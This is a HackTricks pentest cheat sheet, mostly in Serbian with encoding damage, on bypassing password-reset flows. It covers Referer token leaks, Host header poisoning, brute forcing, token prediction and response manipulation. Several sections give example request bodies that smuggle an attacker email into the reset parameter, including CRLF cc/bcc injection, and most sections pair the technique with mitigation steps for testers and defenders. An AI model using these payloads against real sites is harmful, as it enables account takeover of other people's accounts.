# Reset/Forgotten Password Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## **Password Reset Token Leak Via Referrer**

* HTTP referer header mo쬰 otkriti token za resetovanje lozinke ako je uklju캜en u URL. Ovo se mo쬰 desiti kada korisnik klikne na link tre캖e strane nakon 코to zatra쬴 resetovanje lozinke.
* **Impact**: Potencijalno preuzimanje naloga putem Cross-Site Request Forgery (CSRF) napada.
* **Exploitation**: Da biste proverili da li se token za resetovanje lozinke otkriva u referer header-u, **zatra쬴te resetovanje lozinke** na va코u email adresu i **kliknite na link za resetovanje** koji je dostavljen. **Ne menjajte lozinku** odmah. Umesto toga, **navigirajte do veb stranice tre캖e strane** (kao 코to su Facebook ili Twitter) dok **presre캖ete zahteve koriste캖i Burp Suite**. Istra쬴te zahteve da vidite da li **referer header sadr쬴 token za resetovanje lozinke**, jer to mo쬰 izlo쬴ti osetljive informacije tre캖im stranama.
* **References**:
* [HackerOne Report 342693](https://hackerone.com/reports/342693)
* [HackerOne Report 272379](https://hackerone.com/reports/272379)
* [Password Reset Token Leak Article](https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a)

## **Password Reset Poisoning**

* Napada캜i mogu manipulisati Host header-om tokom zahteva za resetovanje lozinke kako bi usmerili link za resetovanje na zlo캖udnu stranicu.
* **Impact**: Dovodi do potencijalnog preuzimanja naloga otkrivanjem reset tokena napada캜ima.
* **Mitigation Steps**:
* Validirajte Host header u odnosu na belu listu dozvoljenih domena.
* Koristite sigurne, server-side metode za generisanje apsolutnih URL-ova.
* **Patch**: Koristite `$_SERVER['SERVER_NAME']` za konstrukciju URL-ova za resetovanje lozinke umesto `$_SERVER['HTTP_HOST']`.
* **References**:
* [Acunetix Article on Password Reset Poisoning](https://www.acunetix.com/blog/articles/password-reset-poisoning/)

## **Password Reset By Manipulating Email Parameter**

Napada캜i mogu manipulisati zahtevom za resetovanje lozinke dodavanjem dodatnih email parametara kako bi preusmerili link za resetovanje.

* Dodajte email napada캜a kao drugi parametar koriste캖i &
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* Dodajte email napada캜a kao drugi parametar koriste캖i %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* Dodajte email napada캜a kao drugi parametar koriste캖i |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* Dodajte email napada캜a kao drugi parametar koriste캖i cc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* Dodajte email napada캜a kao drugi parametar koriste캖i bcc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* Dodajte email napada캜a kao drugi parametar koriste캖i ,
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* Dodajte email napada캜a kao drugi parametar u json nizu
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
* **Koraci za ubla쬬vanje**:
* Ispravno analizirati i validirati email parametre na serverskoj strani.
* Koristiti pripremljene izjave ili parametrizovane upite kako bi se spre캜ili napadi injekcijom.
* **Reference**:
* [https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be](https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be)
* [https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/](https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/)
* [https://twitter.com/HusseiN98D/status/1254888748216655872](https://twitter.com/HusseiN98D/status/1254888748216655872)

## **Menjanje email-a i lozinke bilo kog korisnika putem API parametara**

* Napada캜i mogu modifikovati email i lozinku parametre u API zahtevima kako bi promenili akreditive naloga.
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
* **Koraci za ubla쬬vanje**:
* Osigurati strogu validaciju parametara i provere autentifikacije.
* Implementirati robusno logovanje i pra캖enje kako bi se otkrile i reagovalo na sumnjive aktivnosti.
* **Reference**:
* [Potpuno preuzimanje naloga putem manipulacije API parametrima](https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240)

## **Nema ograni캜enja brzine: Email bombardovanje**

* Nedostatak ograni캜enja brzine na zahtevima za resetovanje lozinke mo쬰 dovesti do bombardovanja email-ova, preplavljuju캖i korisnika sa email-ovima za resetovanje.
* **Koraci za ubla쬬vanje**:
* Implementirati ograni캜enje brzine na osnovu IP adrese ili korisni캜kog naloga.
* Koristiti CAPTCHA izazove kako bi se spre캜ila automatska zloupotreba.
* **Reference**:
* [HackerOne izve코taj 280534](https://hackerone.com/reports/280534)

## **Saznajte kako se generi코e token za resetovanje lozinke**

* Razumevanje obrasca ili metode iza generisanja tokena mo쬰 dovesti do predvi캠anja ili brute-forcing tokena. Neke opcije:
* Na osnovu vremenskog pe캜ata
* Na osnovu UserID-a
* Na osnovu email-a korisnika
* Na osnovu imena i prezimena
* Na osnovu datuma ro캠enja
* Na osnovu kriptografije
* **Koraci za ubla쬬vanje**:
* Koristiti jake, kriptografske metode za generisanje tokena.
* Osigurati dovoljnu nasumi캜nost i du쬴nu kako bi se spre캜ila predvidljivost.
* **Alati**: Koristiti Burp Sequencer za analizu nasumi캜nosti tokena.

## **Pogodna UUID**

* Ako su UUID-ovi (verzija 1) pogodivi ili predvidivi, napada캜i mogu da ih brute-force-uju kako bi generisali va쬰캖e tokene za resetovanje. Proverite:

{% content-ref url="uuid-insecurities.md" %}
[uuid-insecurities.md](uuid-insecurities.md)
{% endcontent-ref %}

* **Koraci za ubla쬬vanje**:
* Koristiti GUID verziju 4 za nasumi캜nost ili implementirati dodatne sigurnosne mere za druge verzije.
* **Alati**: Koristiti [guidtool](https://github.com/intruder-io/guidtool) za analizu i generisanje GUID-ova.

## **Manipulacija odgovorom: Zamenite lo코 odgovor dobrim**

* Manipulacija HTTP odgovorima kako bi se zaobi코le poruke o gre코ci ili ograni캜enja.
* **Koraci za ubla쬬vanje**:
* Implementirati provere na serverskoj strani kako bi se osigurala integritet odgovora.
* Koristiti sigurne komunikacione kanale kao 코to je HTTPS kako bi se spre캜ili napadi "man-in-the-middle".
* **Reference**:
* [Kriti캜na gre코ka u Live Bug Bounty doga캠aju](https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3)

## **Kori코캖enje istekao tokena**

* Testiranje da li se istekao tokeni jo코 uvek mogu koristiti za resetovanje lozinke.
* **Koraci za ubla쬬vanje**:
* Implementirati stroge politike isteka tokena i validirati istekao token na serverskoj strani.

## **Brute Force token za resetovanje lozinke**

* Poku코aj brute-force-a reset tokena koriste캖i alate kao 코to su Burpsuite i IP-Rotator kako bi se zaobi코la ograni캜enja brzine zasnovana na IP-u.
* **Koraci za ubla쬬vanje**:
* Implementirati robusno ograni캜enje brzine i mehanizme zaklju캜avanja naloga.
* Pratiti sumnjive aktivnosti koje ukazuju na brute-force napade.

## **Poku코ajte koristiti svoj token**

* Testiranje da li se napada캜ev reset token mo쬰 koristiti u kombinaciji sa email-om rtve.
* **Koraci za ubla쬬vanje**:
* Osigurati da su tokeni vezani za korisni캜ku sesiju ili druge korisni캜ki specifi캜ne atribute.

## **Neva쬰nje sesije prilikom odjave/resetovanja lozinke**

* Osigurati da se sesije neva쬰 kada se korisnik odjavi ili resetuje svoju lozinku.
* **Koraci za ubla쬬vanje**:
* Implementirati pravilno upravljanje sesijama, osiguravaju캖i da se sve sesije neva쬰 prilikom odjave ili resetovanja lozinke.

## **Neva쬰nje sesije prilikom odjave/resetovanja lozinke**

* Tokeni za resetovanje bi trebali imati vreme isteka nakon kojeg postaju neva쬰캖i.
* **Koraci za ubla쬬vanje**:
* Postaviti razumno vreme isteka za tokene za resetovanje i strogo ga sprovoditi na serverskoj strani.

## Reference

* [https://anugrahsr.github.io/posts/10-Password-reset-flaws/#10-try-using-your-token](https://anugrahsr.github.io/posts/10-Password-reset-flaws/#10-try-using-your-token)

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Pridru쬴te se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na gre코ke!

**Uvidi u hakovanje**\
Uklju캜ite se u sadr쬬j koji se bavi uzbu캠enjem i izazovima hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovija obave코tenja**\
Budite informisani o najnovijim nagradama za gre코ke i va쬹im a쬿riranjima platforme

**Pridru쬴te nam se na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i po캜nite da sara캠ujete sa vrhunskim hakerima danas!

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr코ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite trikove za hakovanje slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
